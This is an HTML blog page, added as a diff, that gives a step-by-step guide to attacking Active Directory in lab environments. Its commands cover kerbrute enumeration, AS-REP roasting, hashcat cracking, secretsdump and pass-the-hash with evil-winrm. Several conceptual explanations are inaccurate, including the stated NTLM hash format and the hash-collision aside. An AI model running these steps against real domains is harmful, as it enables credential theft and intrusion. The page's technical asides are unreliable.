@@ -1,0 +1,128 @@
+<!DOCTYPE html>
+<html lang="en-US">
+  <head>
+    <meta charset='utf-8'>
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <link rel="stylesheet" href="/assets/css/style.css?v=3c993c68704c004880549d8641958c67cd8b1572">
+
+<!-- Begin Jekyll SEO tag v2.7.1 -->
+<title>How 2 Pwn: Active Directory | danjaaron</title>
+<meta name="generator" content="Jekyll v3.9.0" />
+<meta property="og:title" content="How 2 Pwn: Active Directory" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="hax0r central" />
+<meta property="og:description" content="hax0r central" />
+<link rel="canonical" href="http://localhost:4000/AD.html" />
+<meta property="og:url" content="http://localhost:4000/AD.html" />
+<meta property="og:site_name" content="danjaaron" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="How 2 Pwn: Active Directory" />
+<script type="application/ld+json">
+{"description":"hax0r central","url":"http://localhost:4000/AD.html","headline":"How 2 Pwn: Active Directory","@type":"WebPage","@context":"https://schema.org"}</script>
+<!-- End Jekyll SEO tag -->
+
+  </head>
+
+  <body>
+
+    <header>
+      <div class="container">
+        <a id="a-title" href="/">
+          <h1>danjaaron</h1>
+        </a>
+        <h2>hax0r central</h2>
+
+        <section id="downloads">
+          
+          <a href="https://github.com/danjaaron/danjaaron.github.io" class="btn btn-github"><span class="icon"></span>View on GitHub</a>
+        </section>
+      </div>
+    </header>
+
+    <div class="container">
+      <section id="main_content">
+        <h2 id="how-2-pwn-active-directory">How 2 Pwn: Active Directory</h2>
+<p>This is a guide for a straightforward Active Directory attack scenario, YMMV.</p>
+<h3 id="enumerate-shares">0. Enumerate Shares</h3>
+<pre><code>enum4linux [IP]
+</code></pre>
+<p>... generally reveals shares, etc., that will be useful later</p>
+<h3 id="find-the-domain-name">1. Find the Domain Name</h3>
+<p>You need the Active Directory domain name to attack the host.</p>
+<p>You can get the AD domain name by scanning with nmap:</p>
+<pre><code>sudo nmap -sC -sT -sV 10.10.31.222 -oN ldap 
+</code></pre>
+<p>The <strong>-sC</strong> flag is used to deploy standard scripts which use ldap to enumerate port 389, as they will reveal the full domain name</p>
+<p>then add the domain name to /etc/hosts</p>
+<pre><code>[ip] [host name] [domain]
+</code></pre>
+<p>where host name looks like &quot;XXX.htb&quot; and domain name often looks like &quot;XXX.local&quot;</p>
+<h3 id="enumerate-users-on-the-domain">2. Enumerate Users on the Domain</h3>
+<p>Use the domain name to enumerate users:</p>
+<pre><code>kerbrute enumusers --dc [IP ADDRESS] -d [DOMAIN NAME] userlist.txt
+</code></pre>
+<p>note that the domain name is usually a url with a TLD like .com, .org, etc. In the case of AD,
+its often configured using a .local TLD as a matter of habit</p>
+<h3 id="asreproasting-users">3. ASREPRoasting Users</h3>
+<p>Attempt to ASREPRoast user accounts which are misconfigured with &quot;Does not requre Pre-Authentication&quot; using the GetNPUsers.py (NP=no pre-auth) script from Impacket. Specifically we're trying to request kerberos tickets with hashes from the kerberos TGS that we can later crack for passwords. Kerberos will sometimes issue tickets to accounts that do not require pre-auth.</p>
+<pre><code>python3 /opt/impacket/examples/GetNPUsers.py [DOMAIN NAME]/[USERNAME] -no-pass -usersfile ./npusers
+</code></pre>
+<p>where DOMAIN NAME would be something like XXX.local and USERNAME is an enumerated user from step 2</p>
+<p>where the ./npusers file is a list of usernames gained from step #2</p>
+<p>this will give you a kerberos hash that you can crack for a password</p>
+<h3 id="crack-user-passwords">4. Crack User Passwords</h3>
+<p>Crack the hash(s) that you get back from Kerberos TGS using hashcat, generally kb5 type
+... if you're unsure about the type of hash, check on hashcat.net examples page</p>
+<pre><code>hashcat -a 0 -m 18200 ./svc-admin_hash ./passwordlist.txt --force
+</code></pre>
+<h3 id="use-the-cracked-passwords">5. Use the Cracked Passwords</h3>
+<p>After cracking the hash, you now have a user password. Attempt to map out  SAMBA shares using these credentials
+... NOTE: there may have been no shares when you anonymously list with smbclient
+don't let that discourage you. with credentials, new shares are likely visible</p>
+<pre><code>smbclient -L 10.10.64.123 -U svc-admin 
+</code></pre>
+<ul>
+<li>OR, check for wsman on port 5985 (login with evil-winrm)</li>
+<li>OR, check for rdesktop</li>
+<li>basically just check for anywhere to plug the credentials into</li>
+</ul>
+<p>it may be a good idea to do a full port scan, ports 1-65535, to find somewhere to log into</p>
+<h3 id="plug-in-credentials">6. Plug in Credentials</h3>
+<p>6.a. (IF SMB): then connect to a share using those credentials</p>
+<pre><code>smbclient //10.10.64.123/backup -U svc-admin
+</code></pre>
+<p>and steal any info you can</p>
+<p>6.b. (IF WINDOWS): Upload a script like PowerUp.ps1 (see Sauna notes for how to setup SimpleHTTPServer and Invoke-WebRequest to get PowerUp on windows box)</p>
+<p>You might get the autologon.exe credentials, which you can use to dump secrets using the command in step #7 (can also pass a one-liner with password)</p>
+<p>6.c. (LAST RESORT): As a last resort and/or to pivot throughout AD, you might want to upload a SharpHound.exe and gather some .json files with it, exfiltrate
+back with the evil-winrm download function</p>
+<h3 id="dump-secrets">7. Dump Secrets</h3>
+<p>When you can find a user account, use Impacket secretsdump.py to dump all password hashes that the user has access to -- the purpose of this is privilege escalation</p>
+<pre><code>python3 /opt/impacket/examples/secretsdump.py -dc-ip 10.10.64.123 backup@spookysec.local
+</code></pre>
+<p>this yields many hashes</p>
+<p>hashes yielded from DRSUAPI (the NTDS.DIT dump) are NTLM hashes of the form</p>
+<p><strong>[userhash]:[passhash]</strong></p>
+<p>so the part after the colon is the password hash</p>
+<p>NOW, to escalate privileges, remember:</p>
+<p>Why are we grabbing password HASHES? (see: hashing vs encryption)</p>
+<p>It's because applications only check password hashes. they never know or store
+the cleartext password. So, you can PASS THE HASH -- meaning, you can use
+these account password hashes without every knowing the real password -- and
+the application you're attacking will never know the difference. You can
+authenticate using the hash alone</p>
+<p>... aside: hash collision attacks allow you to authenticate by
+guessing a password that creates the same hash using a different
+password, so you can get in without knowing the real password in that
+case as well</p>
+<p>... aside: note that passwords are usually encrypted, then encoded in that order</p>
+<h3 id="pass-the-hash">8. Pass the Hash</h3>
+<p>Pass the hashes you get from dumping secrets to login with <strong>evil-winrm</strong></p>
+
+      </section>
+    </div>
+
+    
+  </body>
+</html>
